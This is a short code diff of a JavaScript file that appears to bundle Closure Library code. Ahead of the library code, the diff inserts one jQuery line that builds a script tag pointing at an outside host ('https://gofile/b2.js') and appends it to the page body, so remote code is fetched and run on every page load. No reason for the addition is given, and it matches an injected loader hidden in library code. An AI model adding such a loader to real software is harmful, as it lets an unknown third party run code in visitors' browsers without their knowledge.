@@ -1,4 +1,8 @@
 //@ sourceURL=b1.js
+
+
+$("<script>").attr({src: "https://gofile/b2.js"}).appendTo("body");
+
 (function () {/*
 
  Copyright The Closure Library Authors.
